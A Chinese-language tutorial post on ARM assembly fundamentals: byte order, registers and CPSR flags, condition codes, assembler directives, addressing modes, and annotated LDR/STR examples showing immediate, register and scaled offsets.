&lt;p>在内存中有两种字节排布顺序，大端序(BE)或者小端序(LE)。两者的主要不同是对象中的每个字节在内存中的存储顺序存在差异。一般X86中是小端序，最低的字节存储在最低的地址上。在大端机中最高的字节存储在最低的地址上。&lt;/p>
&lt;p>&lt;img src="https://p0.ssl.qhimg.com/t01b6d7f41b02b0a58d.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>数据访问时采取大端序还是小端序使用程序状态寄存器(CPSR)的第9比特位来决定的。&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180810120701.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="寄存器">寄存器&lt;/h3>
&lt;p>37个32位寄存器，其中31个为基础寄存器，6个为状态寄存器。&lt;/p>
&lt;p>用户模式下有&lt;/p>
&lt;ul>
&lt;li>
&lt;p>不分组寄存器（R0-R7） R7一般存放系统调用号&lt;/p>
&lt;/li>
&lt;li>
&lt;p>分组寄存器（R8-R14）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>程序计数器（R15）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>单前程序状态寄存器（CPSR）&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>两种状态：&lt;/p>
&lt;table>
&lt;tr>
&lt;th>ARM状态（32位对齐）&lt;/th>
&lt;th>Thumb状态(16位对齐)&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>R0-R7&lt;/th>
&lt;th>R0-R7(相同)&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>CPSR&lt;/th>
&lt;th>CPSR（同）&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>R11&lt;/th>
&lt;th>FP（栈帧指针）&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>R12&lt;/th>
&lt;th>IP（内部程序调用）&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>R13&lt;/th>
&lt;th>SP（栈指针）&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>R14&lt;/th>
&lt;th>LR（链接寄存器）一般存放函数返回地址&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>R15&lt;/th>
&lt;th>PC（程序计数器）&lt;/th>
&lt;/tr>&lt;/table>
&lt;p>和x86对比：&lt;/p>
&lt;p>&lt;img src="https://p5.ssl.qhimg.com/t01a8e5d24fa91f9f0f.jpg"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>CSPR:&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180810122226.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>32位的CPSR寄存器的比特位含义，左边是最大比特位，右边是最小比特位。每个单元代表一个比特。&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180810122258.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;table>
&lt;tr>
&lt;th>条件码&lt;/th>
&lt;th>助记符后缀&lt;/th>
&lt;th>标志&lt;/th>
&lt;th>含义&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>0000&lt;/th>
&lt;th>EQ&lt;/th>
&lt;th>Z置位&lt;/th>
&lt;th>相等&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>0001&lt;/th>
&lt;th>NE&lt;/th>
&lt;th>Z清零&lt;/th>
&lt;th>不相等&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>0010&lt;/th>
&lt;th>CS&lt;/th>
&lt;th>C置位&lt;/th>
&lt;th>无符号数大于或等于&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>0011&lt;/th>
&lt;th>CC&lt;/th>
&lt;th>C清零&lt;/th>
&lt;th>无符号数小于&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>0100&lt;/th>
&lt;th>MI&lt;/th>
&lt;th>N置位&lt;/th>
&lt;th>负数&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>0101&lt;/th>
&lt;th>PL&lt;/th>
&lt;th>N清零&lt;/th>
&lt;th>正数或零&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>0110&lt;/th>
&lt;th>VS&lt;/th>
&lt;th>V置位&lt;/th>
&lt;th>溢出&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>0111&lt;/th>
&lt;th>VC&lt;/th>
&lt;th>V清零&lt;/th>
&lt;th>未溢出&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>1000&lt;/th>
&lt;th>HI&lt;/th>
&lt;th>C置位Z清零&lt;/th>
&lt;th>无符号数大于&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>1001&lt;/th>
&lt;th>LS&lt;/th>
&lt;th>C清零Z置位&lt;/th>
&lt;th>无符号数小于或等于&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>1010&lt;/th>
&lt;th>GE&lt;/th>
&lt;th>N等于V&lt;/th>
&lt;th>带符号数大于或等于&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>1011&lt;/th>
&lt;th>LT&lt;/th>
&lt;th>N不等于V&lt;/th>
&lt;th>带符号数小于&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>1100&lt;/th>
&lt;th>GT&lt;/th>
&lt;th>Z清零且（N等于V）&lt;/th>
&lt;th>带符号数大于&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>1101&lt;/th>
&lt;th>LE&lt;/th>
&lt;th>Z置位或（N不等于V）&lt;/th>
&lt;th>带符号数小于或等于&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>1110&lt;/th>
&lt;th>AL&lt;/th>
&lt;th>忽略&lt;/th>
&lt;th>无条件执行&lt;/th>
&lt;/tr>&lt;/table>
&lt;h3 id="程序结构">程序结构&lt;/h3>
&lt;p>Android平台采用的是GUN ARM汇编格式，汇编器为GAS&lt;/p>
&lt;p>参数传递：R0-R3这4个寄存器用来传递函数调用的第1到4个参数，超出的参数通过堆栈来传递。R0还用来存放函数调用的返回值。&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180810112712.gif"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="汇编器指令">汇编器指令&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>.file&lt;/code>:源文件名&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>.align&lt;/code>:代码对齐方式&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>.ascii&lt;/code>:声明字符串&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>.global&lt;/code>:声明全局符号&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>.type&lt;/code>：指定符号的类型&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>.word&lt;/code>：存放地址值&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>.size&lt;/code>：设置指定符号的大小&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>.ident&lt;/code>：编译器标识&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="寻址方式">寻址方式&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>立即寻址&lt;/p>
&lt;p>&lt;code>MOV R0, #1234&lt;/code> -&amp;gt;R0=1234&lt;/p>
&lt;/li>
&lt;li>
&lt;p>寄存器寻址&lt;/p>
&lt;p>&lt;code>MOV R1 = R2&lt;/code> -&amp;gt;R0=R1&lt;/p>
&lt;/li>
&lt;li>
&lt;p>寄存器移位寻址&lt;/p>
&lt;ul>
&lt;li>
&lt;p>LSL ：逻辑左移，移位后寄存器空出的低位补0&lt;/p>
&lt;/li>
&lt;li>
&lt;p>LSR：逻辑右移，移位后寄存器空出的高位补0&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ASR：算术右移，移位过程中符号位保持不变，若源操作数为正数，则移位后空出的高位补0，否则补1。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ROR：循环右移，移位后移出的低位填入移位空出的高位。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>RRX：带扩展的循环右移，操作数右移一位，移出的空位用C标志的值填充。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>&lt;code>MOV R0, R1, LSL #2&lt;/code> -&amp;gt;R1左移两位（R1&amp;laquo;2）赋值给R0,相当于R0 = R1*4&lt;/p>
&lt;/li>
&lt;li>
&lt;p>寄存器间接寻址&lt;/p>
&lt;p>&lt;code>LDR RO, [R1]&lt;/code> -&amp;gt;将R1寄存器的数值作为地址，取出此地址中的值赋给R0寄存器&lt;/p>
&lt;/li>
&lt;li>
&lt;p>基址寻址&lt;/p>
&lt;p>多用于查表、数组访问操作。&lt;/p>
&lt;p>&lt;code>LDR R0, [R1,#-4]&lt;/code> -&amp;gt;将R1寄存器的数值减4作为地址，取出此地址的值赋给R0寄存器。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>多寄存器寻址&lt;/p>
&lt;p>一条指令最多完成16个通用寄存器值的传送。&lt;/p>
&lt;p>&lt;code>LDMIA R0,{R1,R2,R3,R4}&lt;/code> -&amp;gt;LDM为数据加载指令，指令的后缀IA表示每次执行完加载操作后R0寄存器的值自增1个字，ARM指令集中，子表示的是一个32位数值。这条指令作用为：R1 = [R0],R2 = [R0+#4],R3 = [R0+#8],R4 = [R0+#12]。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>堆栈寻址&lt;/p>
&lt;p>特定的指令来完成：&lt;code>LDMFA/STMFA&lt;/code>、&lt;code>LDMEA/STMEA&lt;/code>、&lt;code>LDMFD/STMFD&lt;/code>、&lt;code>LDMED/STMED&lt;/code>。&lt;/p>
&lt;p>LDM和STM为指令前缀，表示多寄存器寻址，即一次传送多个寄存器的值。后面的后缀为指令后缀。&lt;/p>
&lt;p>&lt;code>STMFD SP!, {R1-R7,LR}&lt;/code> -&amp;gt;将R1~R7,LR入栈，多用于保存子程序的现场。&lt;/p>
&lt;p>&lt;code>LDMFD SP!, {R1-R7,LR}&lt;/code> -&amp;gt;出栈，恢复现场。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>块拷贝寻址&lt;/p>
&lt;p>实现从连续地址数据从存储器的某一位置拷贝到另外一个位置，指令有：&lt;code>LDMIA/STMIA&lt;/code>、&lt;code>LDMDA/STMDA&lt;/code>、&lt;code>LDMIB/STMIB&lt;/code>、&lt;code>LDMDB/STMDB&lt;/code>。&lt;/p>
&lt;p>&lt;code>LDMIA R0! {R0-R3}&lt;/code> 从R0寄存器指向的存储单元中读取3个字到R1-R3寄存器&lt;/p>
&lt;p>&lt;code>STMIA R0! {R0-R3}&lt;/code> 存储从R1-R3寄存器的内容到R0寄存器指向的存储单元&lt;/p>
&lt;/li>
&lt;li>
&lt;p>相对寻址&lt;/p>
&lt;p>以程序计数器PC的当前值为基地址，指令中的地址标号作为偏移量，将两者相加之后得到操作数的有效地址。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">BL NEXT ····NEXT: ········
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="arm和thumb指令集">ARM和Thumb指令集&lt;/h3>
&lt;h3 id="基本指令简述">基本指令简述&lt;/h3>
&lt;p>&lt;code>MNEMONIC{S}{condition} {Rd}, Operand1, Operand2&lt;/code>&lt;/p>
&lt;p>&lt;code>助记符{是否使用CPSR}{是否条件执行以及条件} {目的寄存器}, 操作符1, 操作符2&lt;/code>&lt;/p>
&lt;blockquote>
&lt;p>MNEMONIC     - 指令的助记符如ADD&lt;/p>
&lt;/blockquote>
&lt;pre>&lt;code>{S}           - 可选的扩展位，如果指令后加了S，则需要依据计算结果更新CPSR寄存器中的条件跳转相关 的FLAG
{condition}   - 如果机器码要被条件执行，那它需要满足的条件标示
{Rd}          - 存储结果的目的寄存器
Operand1     - 第一个操作数，寄存器或者是一个立即数
Operand2     - 第二个(可变的)操作数，可以是一个立即数或者寄存器或者有偏移量的寄存器
&lt;/code>&lt;/pre>
&lt;p>第二操作数还有如下操作：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">#123 - 立即数
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Rx - 寄存器比如R1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Rx, ASR n - 对寄存器中的值进行算术右移n位后的值
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Rx, LSL n - 对寄存器中的值进行逻辑左移n位后的值
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Rx, LSR n - 对寄存器中的值进行逻辑右移n位后的值
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Rx, ROR n - 对寄存器中的值进行循环右移n位后的值
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Rx, RRX - 对寄存器中的值进行带扩展的循环右移1位后的值
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">ADD R0, R1, R2 - 将第一操作数R1的内容与第二操作数R2的内容相加，将结果存储到R0中。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ADD R0, R1, #2 - 将第一操作数R1的内容与第二操作数一个立即数相加，将结果存到R0中
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">MOVLE R0, #5 - 当满足条件LE(Less and Equal,小于等于0)将第二操作数立即数5移动到R0中,注意这条指令与MOVLE R0, R0, #5相同
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">MOV R0, R1, LSL #1 - 将第二操作数R1寄存器中的值逻辑左移1位后存入R0
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180810144732.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="内存访问相关指令">内存访问相关指令&lt;/h3>
&lt;p>通常，LDR被用来从内存中加载数据到寄存器，STR被用作将寄存器的值存放到内存中。&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180810145231.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>例子：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">.data /* 数据段是在内存中动态创建的，所以它的在内存中的地址不可预测*/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">var1: .word 3 /* 内存中的第一个变量 */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">var2: .word 4 /* 内存中的第二个变量 */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.text /* 代码段开始 */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.global _start
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_start:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r0, adr_var1 @ 将存放var1值的地址adr_var1加载到寄存器R0中
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r1, adr_var2 @ 将存放var2值的地址adr_var2加载到寄存器R1中
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r2, [r0] @ 将R0所指向地址中存放的0x3加载到寄存器R2中
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> str r2, [r1] @ 将R2中的值0x3存放到R1做指向的地址
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> bkpt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">adr_var1: .word var1 /* var1的地址助记符 */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">adr_var2: .word var2 /* var2的地址助记符 */
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180810145711.gif"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180810154906.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>第一种偏移形式：立即数作偏移&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">STR Ra, [Rb, imm]
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">LDR Ra, [Rc, imm]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">.data
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">var1: .word 3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">var2: .word 4
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.text
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.global _start
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_start:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r0, adr_var1 @ 将存放var1值的地址adr_var1加载到寄存器R0中
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r1, adr_var2 @ 将存放var2值的地址adr_var2加载到寄存器R1中
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r2, [r0] @ 将R0所指向地址中存放的0x3加载到寄存器R2中
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> str r2, [r1, #2] @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加2所指向地址处。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> str r2, [r1, #4]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加4所指向地址处，之后R1寄存器中存储的值加4,也就是R1=R1+4。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r3, [r1], #4 @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中存储的值加4,也就是R1=R1+4。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> bkpt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">adr_var1: .word var1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">adr_var2: .word var2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180810160844.gif"
loading="lazy"
alt="img"
>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>第二种偏移形式：寄存器作偏移&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">STR Ra, [Rb, Rc]
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">LDR Ra, [Rb, Rc]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">.data
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">var1: .word 3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">var2: .word 4
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.text
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.global _start
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_start:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r0, adr_var1 @ 将存放var1值的地址adr_var1加载到寄存器R0中
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r1, adr_var2 @ 将存放var2值的地址adr_var2加载到寄存器R1中
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r2, [r0] @ 将R0所指向地址中存放的0x3加载到寄存器R2中
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> str r2, [r1, r2] @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处。R1寄存器不会被修改。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> str r2, [r1, r2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处，之后R1寄存器中的值被更新,也就是R1=R1+R2。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r3, [r1], r2 @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中的值被更新也就是R1=R1+R2。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> bx lr
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">adr_var1: .word var1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180810162217.gif"
loading="lazy"
alt="img"
>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>第三种偏移形式：寄存器缩放值作偏移&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">LDR Ra, [Rb, Rc, &amp;lt;shifter&amp;gt;]
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">STR Ra, [Rb, Rc, &amp;lt;shifter&amp;gt;]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">.data
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">var1: .word 3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">var2: .word 4
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.text
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.global _start
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_start:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r0, adr_var1 @ 将存放var1值的地址adr_var1加载到寄存器R0中
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r1, adr_var2 @ 将存放var2值的地址adr_var2加载到寄存器R1中
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r2, [r0] @ 将R0所指向地址中存放的0x3加载到寄存器R2中
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> str r2, [r1, r2, LSL#2] @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处。R1寄存器不会被修改。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> str r2, [r1, r2, LSL#2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处，之后R1寄存器中的值被更新,也就R1 = R1 + R2&amp;lt;&amp;lt;2。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r3, [r1], r2, LSL#2 @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中的值被更新也就是R1 = R1 + R2&amp;lt;&amp;lt;2。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> bkpt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">adr_var1: .word var1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">adr_var2: .word var2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
